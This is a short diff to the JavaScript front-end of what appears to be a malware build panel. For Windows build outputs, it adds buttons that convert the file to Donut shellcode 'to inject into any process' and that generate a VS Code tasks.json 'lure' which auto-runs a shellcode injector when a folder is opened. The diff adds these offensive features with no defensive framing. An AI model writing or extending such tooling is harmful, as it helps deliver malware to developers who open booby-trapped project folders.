@@ -1286,8 +1286,32 @@ function showBuildFiles(files, buildId, expiresAt) {
       "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
     downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';
 
+    const btnRow = document.createElement("div");
+    btnRow.className = "flex items-center gap-2 flex-wrap";
+    btnRow.appendChild(downloadBtn);
+
+    // Wrap-as buttons for Windows PE files
+    const isWin = file.platform && file.platform.startsWith("windows-");
+    if (isWin) {
+      const scBtn = document.createElement("a");
+      scBtn.href = `/api/build/shellcode/${encodeURIComponent(file.name)}`;
+      scBtn.className =
+        "inline-flex items-center gap-1 px-3 py-1 rounded bg-purple-700 hover:bg-purple-800 text-white text-sm transition-colors";
+      scBtn.title = "Convert to Donut shellcode (.bin) — inject into any process";
+      scBtn.innerHTML = '<i class="fa-solid fa-bomb"></i> Donut SC';
+      btnRow.appendChild(scBtn);
+
+      const tasksBtn = document.createElement("a");
+      tasksBtn.href = `/api/build/tasks-json/${encodeURIComponent(file.name)}`;
+      tasksBtn.className =
+        "inline-flex items-center gap-1 px-3 py-1 rounded bg-amber-700 hover:bg-amber-800 text-white text-sm transition-colors";
+      tasksBtn.title = "Generate VS Code tasks.json lure — auto-runs shellcode injector on folder open";
+      tasksBtn.innerHTML = '<i class="fa-solid fa-code"></i> tasks.json';
+      btnRow.appendChild(tasksBtn);
+    }
+
     fileDiv.appendChild(fileInfo);
-    fileDiv.appendChild(downloadBtn);
+    fileDiv.appendChild(btnRow);
     buildFilesDiv.appendChild(fileDiv);
   });
 }
